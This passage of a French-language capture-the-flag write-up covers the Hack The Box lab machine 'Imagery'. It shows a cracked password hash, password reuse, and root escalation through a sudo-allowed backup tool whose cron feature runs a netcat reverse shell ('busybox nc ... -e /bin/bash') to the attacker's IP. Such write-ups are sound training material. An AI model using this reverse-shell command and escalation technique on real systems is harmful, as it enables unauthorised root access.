+[📁] File decrypted successfully as: web_20250806_120723.zip</code></pre></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-8026-86f8-d1d6798eef0b" class="">je cat le db.json et Il y a un user en plus</p></div><div style="display:contents" dir="auto"><pre id="2b5aa764-c45c-80a3-b2db-cb2988ef4c55" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">&quot;username&quot;: &quot;mark@imagery.htb&quot;,
+&quot;password&quot;: &quot;01c3d2e5bdaf6134cec0a367cf53e535&quot;,</code></pre></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-8043-9aaa-d21fb449c7bb" class="">je <a href="https://crackstation.net/">crack le hash</a> : supersmash</p></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-80d0-85f0-ffd8e170f92e" class="">c’est donc le mdp de mark</p></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-802e-9db9-d1fe95b2572b" class="">je prie pour une password reuse en faisant su mark et en mettant ces creds (puisque je ne peux pas me ssh)</p></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-80a6-8ca6-e0731cfa7d30" class="">j’y suis et je cat user</p></div><div style="display:contents" dir="auto"><h1 id="2b5aa764-c45c-8093-b3f2-dcfbaf535b85" class="">Root</h1></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-804f-a79c-e4baa6e78829" class="">je commence la privesc j’ai mon linpeas</p></div><div style="display:contents" dir="auto"><pre id="2b5aa764-c45c-80a6-afbd-ea1ca512865b" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">mark@Imagery:~$ sudo -l
+sudo -l
+Matching Defaults entries for mark on Imagery:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User mark may run the following commands on Imagery:
+    (ALL) NOPASSWD: /usr/local/bin/charcol</code></pre></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-8064-81b5-d178a7acf6ba" class=""><code>/usr/local/bin/charcol</code> est un binaire que mark peux executer en tant que qui il veux (dont root)</p></div><div style="display:contents" dir="auto"><pre id="2b5aa764-c45c-80fd-a222-f7faff61177d" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">mark@Imagery:~$ sudo /usr/local/bin/charcol -h
+sudo /usr/local/bin/charcol -h
+usage: charcol.py [--quiet] [-R] {shell,help} ...
+
+Charcol: A CLI tool to create encrypted backup zip files.
+
+positional arguments:
+  {shell,help}          Available commands
+    shell               Enter an interactive Charcol shell.
+    help                Show help message for Charcol or a specific command.
+
+options:
+  --quiet               Suppress all informational output, showing only
+                        warnings and errors.
+  -R, --reset-password-to-default
+                        Reset application password to default (requires system
+                        password verification).</code></pre></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-80d3-a805-dfdf36928648" class="">je reset le password</p></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-803c-bccb-fdae04cdeb27" class="">je rentre dans l’app dans le mode interractif avec </p></div><div style="display:contents" dir="auto"><pre id="2b5aa764-c45c-809a-9fa6-c4cc2380f28c" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">mark@Imagery:~$ sudo /usr/local/bin/charcol shell</code></pre></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-80a8-b00d-cbe4e1569897" class="">je fait un help pour voir les commandes disponnibles</p></div><div style="display:contents" dir="auto"><pre id="2b5aa764-c45c-805b-98b0-e60303d50da7" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">bash-5.2$ sudo /usr/local/bin/charcol shell
+sudo /usr/local/bin/charcol shell
+
+  ░██████  ░██                                                  ░██
+ ░██   ░░██ ░██                                                  ░██
+░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██
+░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██
+░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██
+ ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██
+  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██
+
+
+
+Charcol The Backup Suit - Development edition 1.0.0
+
+[2025-11-24 13:18:08] [INFO] Entering Charcol interactive shell. Type &#x27;help&#x27; for commands, &#x27;exit&#x27; to quit.
+charcol&gt; help
+help
+[2025-11-24 13:18:17] [INFO]
+Charcol Shell Commands:
+
+  Backup &amp; Fetch:
+    backup -i &lt;paths...&gt; [-o &lt;output_file&gt;] [-p &lt;file_password&gt;] [-c &lt;level&gt;] [--type &lt;archive_type&gt;] [-e &lt;patterns...&gt;] [--no-timestamp] [-f] [--skip-symlinks] [--ask-password]
+      Purpose: Create an encrypted backup archive from specified files/directories.
+      Output: File will have a &#x27;.aes&#x27; extension if encrypted. Defaults to &#x27;/var/backup/&#x27;.
+      Naming: Automatically adds timestamp unless --no-timestamp is used. If no -o, uses input filename as base.
+      Permissions: Files created with 664 permissions. Ownership is user:group.
+      Encryption:
+        - If &#x27;--app-password&#x27; is set (status 1) and no &#x27;-p &lt;file_password&gt;&#x27; is given, uses the application password for encryption.
+        - If &#x27;no password&#x27; mode is set (status 2) and no &#x27;-p &lt;file_password&gt;&#x27; is given, creates an UNENCRYPTED archive.
+      Examples:
+        - Encrypted with file-specific password:
+          backup -i /home/user/my_docs /var/log/nginx/access.log -o /tmp/web_logs -p &lt;file_password&gt; --verbose --type tar.gz -c 9
+        - Encrypted with app password (if status 1):
+          backup -i /home/user/example_file.json
+        - Unencrypted (if status 2 and no -p):
+          backup -i /home/user/example_file.json
+        - No timestamp:
+          backup -i /home/user/example_file.json --no-timestamp
+
+    fetch &lt;url&gt; [-o &lt;output_file&gt;] [-p &lt;file_password&gt;] [-f] [--ask-password]
+      Purpose: Download a file from a URL, encrypt it, and save it.
+      Output: File will have a &#x27;.aes&#x27; extension if encrypted. Defaults to &#x27;/var/backup/fetched_file&#x27;.
+      Permissions: Files created with 664 permissions. Ownership is current user:group.
+      Restrictions: Fetching from loopback addresses (e.g., localhost, 127.0.0.1) is blocked.
+      Encryption:
+        - If &#x27;--app-password&#x27; is set (status 1) and no &#x27;-p &lt;file_password&gt;&#x27; is given, uses the application password for encryption.
+        - If &#x27;no password&#x27; mode is set (status 2) and no &#x27;-p &lt;file_password&gt;&#x27; is given, creates an UNENCRYPTED file.
+      Examples:
+        - Encrypted:
+          fetch &lt;URL&gt; -o &lt;output_file_path&gt; -p &lt;file_password&gt; --force
+        - Unencrypted (if status 2 and no -p):
+          fetch &lt;URL&gt; -o &lt;output_file_path&gt;
+
+  Integrity &amp; Extraction:
+    list &lt;encrypted_file&gt; [-p &lt;file_password&gt;] [--ask-password]
+      Purpose: Decrypt and list contents of an encrypted Charcol archive.
+      Note: Requires the correct decryption password.
+      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.
+      Example:
+        list /var/backup/&lt;encrypted_file_name&gt;.zip.aes -p &lt;file_password&gt;
+
+    check &lt;encrypted_file&gt; [-p &lt;file_password&gt;] [--ask-password]
+      Purpose: Decrypt and verify the structural integrity of an encrypted Charcol archive.
+      Note: Requires the correct decryption password. This checks the archive format, not internal data consistency.
+      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.
+      Example:
+        check /var/backup/&lt;encrypted_file_name&gt;.tar.gz.aes -p &lt;file_password&gt;
+
+    extract &lt;encrypted_file&gt; &lt;output_directory&gt; [-p &lt;file_password&gt;] [--ask-password]
+      Purpose: Decrypt an encrypted Charcol archive and extract its contents.
+      Note: Requires the correct decryption password.
+      Example:
+        extract /var/backup/&lt;encrypted_file_name&gt;.zip.aes /tmp/restored_data -p &lt;file_password&gt;
+
+  Automated Jobs (Cron):
+    auto add --schedule &quot;&lt;cron_schedule&gt;&quot; --command &quot;&lt;shell_command&gt;&quot; --name &quot;&lt;job_name&gt;&quot; [--log-output &lt;log_file&gt;]
+      Purpose: Add a new automated cron job managed by Charcol.
+      Verification:
+        - If &#x27;--app-password&#x27; is set (status 1): Requires Charcol application password (via global --app-password flag).
+        - If &#x27;no password&#x27; mode is set (status 2): Requires system password verification (in interactive shell).
+      Security Warning: Charcol does NOT validate the safety of the --command. Use absolute paths.
+      Examples:
+        - Status 1 (encrypted app password), cron:
+          CHARCOL_NON_INTERACTIVE=true charcol --app-password &lt;app_password&gt; auto add \
+          --schedule &quot;0 2 * * *&quot; --command &quot;charcol backup -i /home/user/docs -p &lt;file_password&gt;&quot; \
+          --name &quot;Daily Docs Backup&quot; --log-output &lt;log_file_path&gt;
+        - Status 2 (no app password), cron, unencrypted backup:
+          CHARCOL_NON_INTERACTIVE=true charcol auto add \
+          --schedule &quot;0 2 * * *&quot; --command &quot;charcol backup -i /home/user/docs&quot; \
+          --name &quot;Daily Docs Backup&quot; --log-output &lt;log_file_path&gt;
+        - Status 2 (no app password), interactive:
+          auto add --schedule &quot;0 2 * * *&quot; --command &quot;charcol backup -i /home/user/docs&quot; \
+          --name &quot;Daily Docs Backup&quot; --log-output &lt;log_file_path&gt;
+          (will prompt for system password)
+
+    auto list
+      Purpose: List all automated jobs managed by Charcol.
+      Example:
+        auto list
+
+    auto edit &lt;job_id&gt; [--schedule &quot;&lt;new_schedule&gt;&quot;] [--command &quot;&lt;new_command&gt;&quot;] [--name &quot;&lt;new_name&gt;&quot;] [--log-output &lt;new_log_file&gt;]
+      Purpose: Modify an existing Charcol-managed automated job.
+      Verification: Same as &#x27;auto add&#x27;.
+      Example:
+        auto edit &lt;job_id&gt; --schedule &quot;30 4 * * *&quot; --name &quot;Updated Backup Job&quot;
+
+    auto delete &lt;job_id&gt;
+      Purpose: Remove an automated job managed by Charcol.
+      Verification: Same as &#x27;auto add&#x27;.
+      Example:
+        auto delete &lt;job_id&gt;
+
+  Shell &amp; Help:
+    shell
+      Purpose: Enter this interactive Charcol shell.
+      Example:
+        shell
+
+    exit
+      Purpose: Exit the Charcol shell.
+      Example:
+        exit
+
+    clear
+      Purpose: Clear the interactive shell screen.
+      Example:
+        clear
+
+    help [command]
+      Purpose: Show help for Charcol or a specific command.
+      Example:
+        help backup
+
+Global Flags (apply to all commands unless overridden):
+  --app-password &lt;password&gt;    : Provide the Charcol *application password* directly. Required for &#x27;auto&#x27; commands if status 1. Less secure than interactive prompt.
+  -p, &quot;--password&quot; &lt;password&gt;    : Provide the *file encryption/decryption password* directly. Overrides application password for file operations. Less secure than --ask-password.
+  -v, &quot;--verbose&quot;                : Enable verbose output.
+  --quiet                      : Suppress informational output (show only warnings and errors).
+  --log-file &lt;path&gt;            : Log all output to a specified file.
+  --dry-run                    : Simulate actions without actual file changes (for &#x27;backup&#x27; and &#x27;fetch&#x27;).
+  --ask-password               : Prompt for the *file encryption/decryption password* securely. Overrides -p and application password for file operations.
+  --no-banner                   : Do not display the ASCII banner.
+  -R, &quot;--reset-password-to-default&quot;  : Reset application password to default (requires system password verification).</code></pre></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-80d7-96a2-d2a5944e326d" class="">je dois trouver un moyens d’executer des commandes en partant du mode interractif (puisqu’il s’execute en root)</p></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-802b-95f8-e38ed351877d" class="">on peut ajouter des taches cron </p></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-800e-9d6f-ffcee8a44479" class="">je met 9001 parce que 6677 est occupé pour mon shell actuel</p></div><div style="display:contents" dir="auto"><pre id="2b5aa764-c45c-805e-8ab2-f812cd6167c6" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">charcol&gt; auto add --schedule &quot;* * * * *&quot; --command &quot;busybox nc 10.10.15.157 9001 -e /bin/bash&quot; --name &quot;yg&quot;</code></pre></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-8095-a971-db74d58cfe34" class="">je cat root</p></div></div>
+            </div>
+        </div>
+    </main>
+</body>
+
+</html>
